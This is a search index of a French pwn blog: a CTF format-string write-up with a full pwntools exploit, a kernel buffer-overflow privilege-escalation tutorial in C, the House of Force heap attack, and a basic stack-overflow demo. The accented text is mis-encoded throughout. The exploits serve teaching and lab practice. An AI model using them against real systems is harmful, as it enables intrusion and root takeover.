[{"categories":["format string","HSR","pwn"],"content":" Binary AnalysisPour analyser le binaire, on va commencer par l‚Äôouvrir avec un d√©compilo, comme Binja. Le binaire n‚Äô√©tant pas stripp√©, on peut s‚Äôaider des symboles pour deviner ce que fait chaque fonction. A part la fonction backdoor() qui aspire √† servir de fonction win(), le nom des fonctions ne nous apporte rien d‚Äôint√©ressant. Regardons un peu plus en d√©tail ce que fait le programme. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:0","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" Main()Tout d‚Äôabord, la fonction main() va lire l‚Äôentr√©e standard √† 2 reprises, attendant de l‚Äôutilisateur qu‚Äôil envoie une chaine de maximum 0x64 caract√®res. Ensuite elle va stocker ces entr√©es dans 2 buffers, puis appeler la fonction beaufortCipher() avec ces 2 buffers en param√®tres. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:1","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" beaufortCipher()Quant √† la fonction cipherBeaufort(), comme son nom l‚Äôindique, elle applique un chiffrement de Beaufort sur notre premi√®re input. La cl√© utilis√©e pour chiffrer le buffer est enfait notre 2√®me input. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:2","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" End of main()Une fois que notre input a √©t√© chiffr√©e avec la cl√© qu‚Äôon donne au programme, la fonction main() affiche le buffer chiffr√©, puis la cl√© qu‚Äôon lui a donn√©. Et c‚Äôest ici que se trouve la vuln. En effet, le printf() que le programme appel pour afficher notre cl√© prend directement la cl√© comme premier argument. Ainsi notre input (la cl√©) est interpet√©e, par printf(), comme √©tant le formatteur. Le programme est donc vuln√©rable √† une format string. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:1:3","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" TheorycraftMaintenant r√©fl√©chissons √† comment on va exploiter la vuln. Si on fait un checksec, on remarque que le binaire n‚Äôa ni PIE, ni RelRO. Canary : ‚úò NX : ‚úì PIE : ‚úò Fortify : ‚úò RelRO : Partial Dans tous les cas on part du principe que l‚ÄôASLR est actif. De plus, comme le chall est en remote, on a pas les d√©tails de l‚Äôenvironnement dans lequel run le binaire, donc c‚Äôest trop foireux de se baser sur des adresses hardcod√©es de la stack. Par contre, l‚Äôabscence de RelRO et de PIE nous permet non seulement de localiser la GOT √† coup s√ªr, mais aussi d‚Äôy acc√©der en √©criture. On peut donc envisager d‚Äôoverwrite certaines entr√©es de la GOT afin d‚Äôobtenir notre shell. Enfin on a une fonction backdoor() qui lance un system(\"/bin/ls\"). La string \"/bin/ls\" √©tant dans la section .data, on peut la changer pour \"/bin/sh\" avant de rediriger le flow d‚Äôexecution vers backdoor(). ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:2:0","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" ExploitationNotre exploit va se faire en 3 √©tapes: Trouver √† quel offset notre input se trouve sur la stack, au moment du call √† printf() Overwrite \"/bin/ls\" avec \"/bin/sh\" Overwrite l‚Äôentr√©e de exit() dans la GOT avec l‚Äôadresse de backup() ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:3:0","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" Input offsetPour trouver l‚Äôoffset, tout ce qu‚Äôon a √† faire est de lancer le programme, break au moment du printf() vuln√©rable et regarder √† quelle distance de $ESP se trouve notre input. Pour rep√©rer facilement notre input, on va envoyer ‚Äúaaaaaaa‚Ä¶‚Äù comme cl√©. On voit que notre input est √† $0$x$78$ bytes de $ESP, soit en 32 bits, $30*4$ bytes. Notre offset est donc 30. ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:3:1","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["format string","HSR","pwn"],"content":" The ExploitPour ce qui est de l‚Äôexploit, on va utiliser le module fmtstr de Pwntools et plus particuli√®rement la fonction fmtstr_payload(). Il nous suffit simplement de lui passer comme argument l‚Äôoffset de notre input ainsi qu‚Äôun dictionnaire des adresses et des valeurs qu‚Äôon souhaite √©crire. payload = fmtstr_payload(30, writes) print(payload) L‚Äôadresse de \"/bin/ls\" est 0x0804c024. On va donc √©crire ‚Äúsh‚Äù √† 0x0804c029, ce qui nous donnera \"/bin/sh\". Enfin on va r√©√©crire l‚Äôentr√©e de exit() dans la GOT par l‚Äôadresse de la fonction backup(). writes = { 0x0804c029: 0x00006873, elfexe.got['exit']: elfexe.sym['backdoor']} Ce qui donne comme exploit final : #!/usr/bin/python3.9 from pwn import * context.binary = elfexe = ELF('./beaufort.bin') def start(argv=[], *a, **kw): '''Start the exploit against the target.''' elf_path = elfexe.path if args.REMOTE: remote_server = '10.22.148.11' remote_port = 1341 target = remote(remote_server, remote_port) else: target = process([elf_path] + argv, *a, **kw) return target #=========================================================== # EXPLOIT GOES HERE #=========================================================== def pad(payload): return payload+b'_'*(0x64-len(payload)) arguments = [] io = start(arguments) writes = {0x0804c029: 0x00006873, elfexe.got['exit']: elfexe.sym['backdoor']} payload = b\"A\"*0x60 io.sendline(payload) payload = fmtstr_payload(30, writes) payload = pad(payload) print(payload) io.sendline(payload) io.interactive() io.close() ","date":"2024-04-01","objectID":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/:3:2","tags":["pwn","format_string","HSR"],"title":"Chiffrement de Beaufort -  HSR 2024","uri":"/MyLittlePwney/writeups/hacksecureims/chiffrement_de_beaufort/"},{"categories":["attacks","kernel"],"content":"Technique pour exploiter un buffer overflow basique c√¥t√© kernel.","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" OverviewTout comme pour une exploitation de BoF en user-land, notre objectif va √™tre d‚Äôoverwrite la return address de la fonction vuln√©rable pour prendre le contr√¥le du flow d‚Äôex√©cution. On se place ici dans le cas o√π aucune protection n‚Äôest pr√©sente au niveau du kernel. ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:1:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" DetailNotre objectif lors de l‚Äôexploitation d‚Äôun buffer overflow en kernel-land est de r√©ussir a ex√©cuter du code user-land tout en profitant de l‚Äôex√©cution de code kernel-land pour √©lever nos privil√®ges. Ainsi, un sch√©ma d‚Äôattaque classique nous donnerait : Exploiter le buffer overflow. Overwrite l‚Äôadresse de retour de la fonction vuln√©rable par l‚Äôadresse de la fonction privesc(). privesc() passe les privil√®ges du process, lanc√© par notre binaire exploit, a root. Maintenant qu‚Äôon a des privil√®ges root, on peut lancer un system(\"/bin/sh\"). ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:2:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":" ExploitPour impl√©menter cette attaque, on va se mettre dans le cas o√π on peut interagir avec une device, dont la propri√©t√© write fait appel √† une fonction vuln√©rable √† un buffer overflow. Ainsi, lorsque l‚Äôon va write() plus de caract√®res qu‚Äôattendu, on va overflow sur la stack kernel. Pour exploiter cela, on va tout d‚Äôabord devoir ouvrir la device pour interagir avec elle. int global_fd; void open_dev(){ global_fd = open(\"/dev/vulnDevice\", O_RDWR); if (global_fd \u003c 0){ puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } Ensuite on va pr√©parer notre fonction privesc() que l‚Äôon va appeler une fois avoir pris le contr√¥le sur le flow d‚Äôex√©cution c√¥t√© kernel. Pour mieux comprendre le principe de l‚Äô√©l√©vation de privil√®ges c√¥t√© kernel, allez voir : Kernel Privesc. unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void privesc(){ commit_creds = 0xc107...; prepare_kernel_cred = 0xc107...; commit_creds(prepare_kernel_cred(0)); } Maintenant qu‚Äôon a la fonction qui va nous permettre d‚Äô√©lever nos privil√®ges, on va pouvoir overflow sur la stack kernel et rediriger le flow d‚Äôex√©cution vers cette fonction. void overflow(){ // Overlow at 64 bytes unsigned long long payload[17] = {0}; payload[16] = (unsigned long)privesc; write(global_fd, payload, sizeof(payload)); } Gr√¢ce √† cet exploit, nous avons manipul√© le kernel pour qu‚Äôil passe le process spawn par exploit en tant que process root. Il ne nous reste plus qu‚Äô√† run un system(\"/bin/sh\") pour obtenir un shell root. En r√©sum√©, notre exploit final donne quelque chose comme : #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cfcntl.h\u003e int global_fd; unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void open_dev(){ global_fd = open(\"/dev/vulnDevice\", O_RDWR); if (global_fd \u003c 0){ puts(\"[!] Failed to open device\"); exit(-1); } else { puts(\"[*] Opened device\"); } } void privesc(){ commit_creds = 0xc107...; prepare_kernel_cred = 0xc107...; commit_creds(prepare_kernel_cred(0)); } void overflow(){ unsigned long long payload[17] = {0}; payload[16] = (unsigned long)privesc; write(global_fd, payload, sizeof(payload)); } int main() { open_dev(); overflow(); system(\"/bin/sh\"); return 0; } ","date":"2024-02-21","objectID":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/:3:0","tags":["pwn","kernel"],"title":"Buffer Overflow Basic","uri":"/MyLittlePwney/pwn/kernel/attacks/buffer-overflow-basic/"},{"categories":["attacks","kernel"],"content":"Introduction au pwn kernel, concept d'√©l√©vation des privil√®ges d'un process.","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/","tags":["pwn","kernel"],"title":"ü™ú Kernel Privesc ü™ú","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" OverviewL‚Äôobjectif de ce post est d‚Äôaborder la couche d‚Äôabstraction n√©c√©ssaire √† la compr√©hension du pwn kernel. Pour cela, il est n√©c√©ssaire de comprendre comment les diff√©rents process interagissent avec le kernel, et comment un contr√¥le de flow d‚Äôexecution en kernel-mode peut nous permettre d‚Äôam√©liorer nos privil√®ges en user-land. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:1:0","tags":["pwn","kernel"],"title":"ü™ú Kernel Privesc ü™ú","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" Process x KernelIl est important de noter que l‚Äôon interagit avec le kernel de pleins de mani√®res diff√©rentes. Que ce soit en modifiant le filesystem, avec des syscalls, en communiquant avec des devices‚Ä¶ Toutes ces actions n√©c√©ssitent une intervention du kernel au niveau des process qui les initient. Pour comprendre et manipuler les process, le kernel linux utilise une structure task_struct contenant toutes le informations dont il a besoin : PID, √©tat du process, niveau de permissions‚Ä¶ Il sauvegarde la task_struct de tous les process en m√©moire, sous forme de liste chain√©e. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:2:0","tags":["pwn","kernel"],"title":"ü™ú Kernel Privesc ü™ú","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" PrivescPuisque le kernel peut modifier la structure d‚Äôun process, alors il peut modifier les permissions de ce process, et notamment les passer a root. Ainsi, si on trouve une faille niveau kernel qui nous permet de prendre le contr√¥le du flow d‚Äôexecution, alors nous pouvons simplement lancer un process en user-land, augmenter ses privileges c√¥t√© kernel et retourner en user-land. Pour faire cela, on va donc modifier la task_struct du process qu‚Äôon a lanc√© et changer ses privil√®ges. Comme les privil√®ges d‚Äôune task_struct sont, eux aussi, d√©finis sous forme de structure, on va faire appel √† des fonctions kernel pour modifier proprement la task_struct. /* Process credentials: */ /* Tracer's credentials at attach: */ const struct cred __rcu *ptracer_cred; /* Objective and real subjective task credentials (COW): */ const struct cred __rcu *real_cred; /* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu *cred; Les fonctions commit_creds() et prepare_kernel_cred() vont nous permettre de faire cela. Pour les appeler correctement, a partir de leur adresse, il faut d‚Äôabord les d√©finir. unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred); unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred); void escalate_privs(void){ commit_creds = 0x...; prepare_kernel_cred = 0x...; commit_creds(prepare_kernel_cred(0)); } NB: Il y a plusieurs moyens de trouver les adresses de fonctions kernel. Le plus simple est de lire le fichier /proc/kallsyms qui map les adresses et le symboles kernels. II ne reste donc plus qu‚Äô√† appeler la fonction escalate_privs(). Ce qui n‚Äôest possible que si le kernel a des droits d‚Äôexecution en user-land (pas de SMEP). Sinon il faudra trouver un moyen d√©tourn√© de faire l‚Äôappel aux fonctions. Et maintenant le process d√©tient des privil√®ges root sur la machine. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:3:0","tags":["pwn","kernel"],"title":"ü™ú Kernel Privesc ü™ú","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["attacks","kernel"],"content":" TLDRPour simplifier, le but est d‚Äôexploiter une vulnerabilit√© pour prendre le contr√¥le du flow d‚Äôexecution c√¥t√© kernel. Ensuite, on va utiliser les fonctions kernel commit_creds() et prepare_kernel_cred() pour modifier les privil√®ges de notre process. Enfin, on va retourner en user-land pour continuer l‚Äôexecution de notre process avec les privil√®ges amelior√©s. ","date":"2024-02-19","objectID":"/MyLittlePwney/pwn/kernel/kernel-privesc/:4:0","tags":["pwn","kernel"],"title":"ü™ú Kernel Privesc ü™ú","uri":"/MyLittlePwney/pwn/kernel/kernel-privesc/"},{"categories":["heap","attacks"],"content":"fa-solid fa-trash-can fa-fw fa-sm","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/","tags":["pwn","heap"],"title":"üî• House of Force üî•","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" OverviewL‚Äôobjectif de cette attaque est d‚Äôoverwrite les metadata du top chunk pour augmenter sa size. Ainsi on va pouvoir faire des malloc sur un espace m√©moire beaucoup plus grand et donc malloc en dehors de la HEAP. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:1:0","tags":["pwn","heap"],"title":"üî• House of Force üî•","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" DetailDans les versions de la GLIBC \u003c 2.29, il n‚Äôy a pas de check sur l‚Äôint√©grit√© des metadata du top chunk. Ainsi, si la size du top chunk est overwrite, l‚Äôalgorithme malloc fonctionnera quand m√™me. Comme les chunks sont allou√©s √† partir du top chunk, si on overwrite la size du top chunk, on devrait √™tre en mesure de couvrir l‚Äôensemble des adresses de la m√©moire, y compris les addresses en dehors de la heap. L‚Äôint√©r√™t de cette attaque est de pouvoir overwrite des valeurs √† des adresses plus basses que l‚Äôadresse de la HEAP. Voir de simplement overwrite des valeurs en dehors de la HEAP. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:2:0","tags":["pwn","heap"],"title":"üî• House of Force üî•","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" ExploitL‚Äôattaque en elle m√™me se d√©roule en 3 √©tapes : Overflow notre buffer et overwrite la size du top chunk. On va le set √† une valeur suffisamment grande pour que l‚Äôadresse cibl√©e soit comprise dans la range d‚Äôadresses couvertes par le top chunk. On fait un malloc pour placer le d√©but du top chunk juste avant l‚Äôadresse cibl√©e. On effectue un nouveau malloc() qui va nous permettre d‚Äôatteindre l‚Äôadresse cibl√©e. ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:3:0","tags":["pwn","heap"],"title":"üî• House of Force üî•","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" Further usePour aller plus loin, on peut tenter d‚Äôutiliser cette attaque pour obtenir un shell. Pour cela, un strat√©gie peut √™tre d‚Äôoverwrite l‚Äôadresse du Malloc hook. Ce dernier √©tant utilis√© √† chaque appel de la fonction malloc(), on peut le remplacer par l‚Äôadresse de la fonction system() et lui passer une adresse pointant vers un \"/bin/sh\". Ainsi, chaque nouvel appel √† la fonction malloc() va hook vers un appel √† system(). ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:4:0","tags":["pwn","heap"],"title":"üî• House of Force üî•","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":["heap","attacks"],"content":" LimitationsA partir de la GLIBC 2.29, la size du top chunk est v√©rifi√©e pour s‚Äôassurer que le top chunk ne sorte pas de sa zone m√©moire. GLIBC Top Chunk Size check ","date":"2023-02-20","objectID":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/:5:0","tags":["pwn","heap"],"title":"üî• House of Force üî•","uri":"/MyLittlePwney/pwn/heap-attacks/attacks/house-of-force/"},{"categories":null,"content":" The BugLe Buffer Overflow est un bug qui se produit lorsqu‚Äôun programme ecrit dans un buffer plus de bytes que le buffer ne peut en accueillir. Ce que l‚Äôon designe par le terme de buffer est une zone memoire dont le programme controle le contenu. Cela peut representer n‚Äôimporte quel element present en memoire (variables, constantes, zone memoire dynamique‚Ä¶). Le probleme avec ce bug etant que le programme tout entier s‚Äôappuie sur la memoire pour fonctionner. Ainsi en debordant du buffer le programme va potentiellement reecrire d‚Äôautres elements presents en memoire et donc des element necessaire a son propre fonctionnement, ce qui va souvent provoquer un crash. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:1:0","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" Demonstration du BugPour que ce soit plus parlant voici un exemple tres basique que l‚Äôon va etudier en assembleur pour mieux comprendre le reel fonctionnement du programme et comment il interragit avec la memoire. #include \u003cstdio.h\u003e int main(){ int check = 0; char buffer[16]; gets(buffer); if (check == 0x1337) printf(\"Well Done!!\"); return 0; } ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:0","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" AnalysisLe programme est tres simple. Il defini une variable check qu‚Äôil initialise a 0. Il defini ensuite un tableau de caracteres, que l‚Äôon peu definir comme un buffer puisque un tableau de 16 carateres reprensente concretement une zone memoire de 16 bytes reservee a cette variable. Ensuite, il lit depuis l‚Äôentree standard et save l‚Äôinput lu dans le buffer. Enfin, il verifie que la variable check est bien egale a 0x1337. Ca peut paraitre un peu bizarre. Pourquoi la variable check serait egale a 0x1337 si elle a ete initialisee a 0 et inchangee. Et bien peut etre que le programme est vulnerable et que l‚Äôon peut reecrire la valeur de check üòà. Si on s‚Äôen referre a la man page de gets(), on se rend compte que la fonction gets() lit la premiere ligne de l‚Äôentree standard (stdin) et la sauvegarde dans le buffer passe en parametre. DESCRIPTION gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\\0'). No check for buffer overrun is performed (see BUGS below). Wait, wait, wait‚Ä¶ Si gets() lit la premiere ligne de stdin, et que notre buffer ne peut accueilir que 16 bytes, que se passe-t-il si la ligne lu fait plus de 16 bytes? ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:1","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" AssemblyPour le comprendre, regardons ce que fait le programme en bas niveau : push rbp mov rbp,rsp sub rsp,0x20 mov DWORD PTR [rbp-0x4],0x0 lea rax,[rbp-0x20] mov rdi,rax mov eax,0x0 call 0x1040 \u003cgets@plt\u003e cmp DWORD PTR [rbp-0x4],0x1337 jne 0x1186 \u003cmain+61\u003e lea rax,[rip+0xe8b] # 0x2004 mov rdi,rax mov eax,0x0 call 0x1030 \u003cprintf@plt\u003e mov eax,0x0 leave ret Concretement, il y a 2 parties interressantes a regarder : D‚Äôabord, le programme va sauvegarder la valeur de check sur la stack. mov DWORD PTR [rbp-0x4],0x0 Ensuite il reserve une zone memoire de minimum 16 bytes (sur la stack) et passe son adresse en argunent a gets(). lea rax,[rbp-0x20] mov rdi,rax mov eax,0x0 call 0x1040 \u003cgets@plt\u003e Ainsi, si on deroule l‚Äôexecution du programme notre stack va ressembler a quelque chose comme ca: [SCHEMA] ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:2","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" ExploitSi on s‚Äôinteresse a ce que fait reelement la fonction gets(), elle prend tout simplement un adresse memoire (ici l‚Äôadresse de notre buffer), et y ecrit les bytes lus depuis l‚Äôentree standard. Le probleme est qu‚Äôa l‚Äôadresse de buffer+0x1c, il y a la valeur de check. Donc si gets lit plus de 28 bytes, il va ecrire par dessus la valeur de check. [SCHEMA] Si on lance un debugger, qu‚Äôon test notre exploit et qu‚Äôon break sur l‚Äôinstruction qui verifie la valeur de check, on peut voir qu‚Äôon a bien reecrit la valeur de check sauvegardee en memoire. (gdb) disas main Dump of assembler code for function main: 0x0000000000001149 \u003c+0\u003e: push rbp 0x000000000000114a \u003c+1\u003e: mov rbp,rsp 0x000000000000114d \u003c+4\u003e: sub rsp,0x20 0x0000000000001151 \u003c+8\u003e: mov DWORD PTR [rbp-0x4],0x0 0x0000000000001158 \u003c+15\u003e: lea rax,[rbp-0x20] 0x000000000000115c \u003c+19\u003e: mov rdi,rax 0x000000000000115f \u003c+22\u003e: mov eax,0x0 0x0000000000001164 \u003c+27\u003e: call 0x1040 \u003cgets@plt\u003e 0x0000000000001169 \u003c+32\u003e: cmp DWORD PTR [rbp-0x4],0x1337 0x0000000000001170 \u003c+39\u003e: jne 0x1186 \u003cmain+61\u003e 0x0000000000001172 \u003c+41\u003e: lea rax,[rip+0xe8b] # 0x2004 0x0000000000001179 \u003c+48\u003e: mov rdi,rax 0x000000000000117c \u003c+51\u003e: mov eax,0x0 0x0000000000001181 \u003c+56\u003e: call 0x1030 \u003cprintf@plt\u003e 0x0000000000001186 \u003c+61\u003e: mov eax,0x0 0x000000000000118b \u003c+66\u003e: leave 0x000000000000118c \u003c+67\u003e: ret (gdb) b *main+32 Breakpoint 1 at 0x1169 (gdb) r Starting program: /root/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB On inspecte le contexte dans lequel on a break dans gdb. (gdb) x/i $rip =\u003e 0x555555555169 \u003cmain+32\u003e: cmp DWORD PTR [rbp-0x4],0x1337 (gdb) x/wx $rbp-0x4 0x7fffffffe2dc: 0x42424242 On a donc bien reussi a overwrite la valeur de check üôÇ. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:3","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"},{"categories":null,"content":" Scripting the ExploitPour finaliser la technique d‚Äôexploitation, on va faire un petit script python qui va gerer toutes les interactions a notre place. ","date":"0001-01-01","objectID":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/:2:4","tags":null,"title":"","uri":"/MyLittlePwney/pwn/stack-buffer-overflow/basic-overflow/"}]